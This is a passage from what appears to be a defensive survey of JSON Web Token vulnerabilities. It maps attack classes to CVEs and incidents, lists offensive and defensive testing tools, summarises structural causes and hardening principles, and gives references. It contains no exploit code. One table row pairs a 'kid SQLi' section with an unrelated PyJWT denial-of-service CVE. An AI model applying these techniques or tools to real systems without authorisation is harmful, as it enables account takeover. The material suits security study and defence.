| §1-2 (RS256→HS256) | **CVE-2024-54150** (cjwt library) | Embedded / IoT systems | Auth bypass; CVSS 9.8. Library passed RSA public key to HMAC verify without type check |
| §1-2 (ECDSA→HS256) | **CVE-2025-27371** | Cloud platform | ECDSA public key recovery enabling token forgery; CVSS Critical |
| §1-1 + §1-2 | **CVE-2025-4692** | Cloud platform | Algorithm confusion flaw; multiple attack vectors |
| §1-1 + §4-1 | **CVE-2025-30144** | JWT library | Signature verification skipped; library bypass |
| §4-4 + §10-1 | **CVE-2026-29000** (pac4j-jwt) | Java applications | JWE-wrapped PlainJWT bypasses signature verification; CVSS **10.0**; unauthenticated remote admin impersonation using only RSA public key |
| §3-4 + §12-2 | **CVE-2024-8901** (aws-alb-route-directive-adapter) | AWS / Istio | ALBeast: shared ALB infrastructure allows issuer forgery; 15,000+ apps vulnerable |
| §3-4 + §12-2 | **CVE-2024-10125** (aws-alb-identity-aspnetcore) | AWS / ASP.NET | Missing `signer` and issuer validation; authentication bypass |
| §3-4 + §12-1 | **HackerOne #1889161** (Argo CD) | Kubernetes CD | aud claim not validated; any OIDC token accepted; Critical severity |
| §3-2 (email spoofing) | **nOAuth** (Microsoft Azure AD) | All apps using "Sign in with Microsoft" | Email claim mutable by attacker; account takeover; $75,000 total bounty donated |
| §5-1 (hardcoded key) | **CVE-2025-7079** (bluebell-plus) | Web applications | Hardcoded `"bluebell-plus"` HMAC secret in `jwt.go` |
| §5-1 (hardcoded key) | **CVE-2025-6950** (Moxa devices) | Industrial IoT / networking gear | Hardcoded JWT signing key in network security devices |
| §2-4 (kid SQLi) | **CVE-2024-53861** (PyJWT) | Python applications | Issuer claim DoS via malformed array |
| §6-3 (JWE invalid curve) | **Multiple** (go-jose, node-jose, Nimbus) | Any JWE ECDH-ES user | Private key recovery via invalid elliptic curve point in JWE `epk` field |
| §9-3 (iss array) | fast-jwt pre-5.0.6 | Node.js applications | Issuer validation bypass via RFC 7519 type violation |
| §3-3 (Back to Future) | LightSEC 2025 research | IoT supply chain | Pre-signed future-dated tokens survive device lifetime; no CVE assigned yet |
| §3-2 (email claim) | Real-world SaaS red team (2025) | Multi-tenant SaaS | Cross-subdomain identity injection; full admin takeover |
| §1-1 (none variant) | **CVE-2015-9235** (jsonwebtoken Node.js) | Node.js applications | Historical: algorithm confusion / none acceptance in widely deployed library |

---

## Detection and Testing Tool Matrix

| Tool | Type | Scope | Core Technique |
|------|------|-------|---------------|
| **jwt_tool** (ticarpi) | Offensive CLI | Full JWT surface | Token decoding, none attack, algorithm confusion, key injection, claim tampering, hashcat integration |
| **Burp Suite JWT Editor** | Offensive Burp extension | Full JWT surface | Visual decode/re-sign, embedded JWK attack, jku/x5u collaborator payloads, HMAC key confusion, kid manipulation |
| **JOSEPH** (Burp) | Offensive Burp extension | Algorithm confusion | RS256→HS256 automated re-sign |
| **Hashcat** (`-m 16500`) | Offensive cracker | Weak HMAC secrets | GPU-accelerated HS256/384/512 secret brute-force |
| **rsa_sign2n** / **sig2n** | Offensive utility | Public key recovery | Derives RSA/EC public key from token pairs for algorithm confusion preparation |
| **jwt.io** | Diagnostic web | Decode / inspect | Base64URL decode and signature verification; key debugger |
| **Burp Scanner** (JWT checks) | Defensive scanner | Automated detection | Detects none algorithm, missing verification, weak secrets since Burp 2022.5.1 |
| **OWASP ZAP JWT addon** | Defensive scanner | None, weak signing | Automated JWT vulnerability detection in web application scans |
| **PyJWT / Nimbus** (hardened) | Defensive library | Implementation | Algorithm allowlisting, mandatory claim validation, key type enforcement |
| **oidc-client-ts** | Defensive library | OIDC token handling | Automatic nonce validation, state binding, audience validation |
| **APIsec** | Defensive CI/CD | API-wide JWT | Continuous automated JWT testing integrated into CI/CD pipelines |
| **Traceable.ai** | Defensive WAF/RASP | Runtime | Detects cross-service relay, abnormal claim patterns, token replay anomalies |
| **tintinweb/ecdsa-private-key-recovery** | Research utility | ECDSA nonce reuse | Recovers EC private key from two signatures sharing the same `r` value |
| **jwt_forgery.py** (silentsignal) | Research utility | RSA key derivation | Computes RSA public modulus candidates from token pairs |

---

## Summary: Core Principles

**What fundamental property makes this mutation space possible?** The JWT specification is deliberately flexible: it delegates algorithm selection, key identification, and claim semantics to the application layer. The `alg` header is attacker-controlled before verification occurs; key-selection parameters (`kid`, `jku`, `jwk`, `x5u`) are optional, standardized, and frequently accepted without whitelisting; and claim validation is entirely the application's responsibility with no mandatory fields beyond the signature. This means the protocol hands the attacker meaningful control over how the server verifies the very token the attacker is presenting. Every category in this taxonomy ultimately exploits one or more of these delegated decisions.

**Why do incremental patches fail to eliminate the threat?** Each vulnerability class is independently rooted in a specification design choice rather than an implementation bug. Fixing algorithm confusion does not fix weak secrets; fixing key injection does not fix claim bypass; fixing signature verification does not fix post-logout replay. The spec's explicit mandates (e.g., only HS256 and `none` are required to implement) create a floor of fragility, while its optional features create an upper ceiling of attack surface. Libraries patch individual CVEs while the structural permissiveness remains. New deployment contexts — microservices, cloud load balancers, agentic AI — continuously introduce new interpretive gaps between the spec and reality.

**What would a structural solution look like?** A robust baseline requires constraining the spec at the library layer: algorithm allowlisting (reject any `alg` not explicitly configured), key type enforcement (reject a symmetric key where asymmetric is expected), mandatory claim validation (reject tokens missing `exp`, `aud`, `iss`), and explicit key-selection from a server-side registry with no attacker-supplied override. For revocation, the architecture must accept that stateless JWTs are unsuitable for high-assurance sessions: short lifetimes (under 15 minutes) combined with server-side refresh token state provide revocability without sacrificing scalability. RFC 8725 (JWT Best Current Practices) codifies these recommendations, but enforcement requires library-level defaults, not developer discipline.

---

## References

1. RFC 7515 — JSON Web Signature (JWS). IETF, 2015.
2. RFC 7516 — JSON Web Encryption (JWE). IETF, 2015.
3. RFC 7517 — JSON Web Key (JWK). IETF, 2015.
4. RFC 7518 — JSON Web Algorithms (JWA). IETF, 2015.
5. RFC 7519 — JSON Web Token (JWT). IETF, 2015.
6. RFC 8725 — JSON Web Token Best Current Practices. IETF, 2020.
7. McLean, T. "Critical Vulnerabilities in JSON Web Token Libraries." Auth0 Blog, 2015.
8. Sanso, A. "Critical Vulnerability Uncovered in JSON Web Encryption." Adobe Security Blog, 2017.
9. PortSwigger Web Security Academy — JWT Attacks. https://portswigger.net/web-security/jwt
10. PortSwigger Web Security Academy — Algorithm Confusion Attacks. https://portswigger.net/web-security/jwt/algorithm-confusion
11. PentesterLab. "The Ultimate Guide to JWT Vulnerabilities and Attacks." May 2025.
12. PentesterLab. "Another JWT Algorithm Confusion Vulnerability: CVE-2024-54150." December 2024.
13. Miggo Research. "ALBeast: A Simple Misconfiguration to a Complete Authentication Bypass." August 2024.
14. CVE-2024-8901 — aws-alb-route-directive-adapter-for-istio missing JWT issuer and signer validation. AWS Security Bulletin AWS-2024-011.
15. CVE-2024-10125 — aws-alb-identity-aspnetcore missing JWT issuer and signer validation. AWS Security Bulletin AWS-2024-012.
16. CVE-2026-29000 — pac4j-jwt JwtAuthenticator Authentication Bypass via JWE-Wrapped PlainJWT. CodeAnt AI Security Research, March 2026. CVSS 10.0.
17. Descope. "nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover." June 2023.
18. HackerOne Report #1889161 — Argo CD JWT audience claim not verified. Critical severity.
19. SecurityPattern. "Exposing a Critical, Systemic Flaw in JWT: The Back to the Future Attack." LightSEC 2025, Istanbul. September 2025.
20. CVE-2025-7079 — Hardcoded JWT key in bluebell-plus. 2025.
21. CVE-2025-6950 — Hardcoded JWT signing key in Moxa network devices. 2025.
22. fast-jwt pre-5.0.6 — iss array claim type confusion bypass. 2025.
23. Trail of Bits. "ECDSA: Handle with Care." June 2020. https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
24. HackTricks. "JWT Vulnerabilities (Json Web Tokens)." https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
25. OWASP WSTG — Testing JSON Web Tokens. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
26. Traceable.ai. "JWTs Under the Microscope: How Attackers Exploit Authentication and Authorization Weaknesses." 2024.
27. AhnLab ASEC. "The Shadow of JWT-Based Authentication: A Fatal Threat Behind the Convenience." December 2025.
28. Deep Strike. "From Email Reuse to Full Admin Takeover: A Real JWT Exploit." January 2025.

---

*This document was created for defensive security research and vulnerability understanding purposes.*
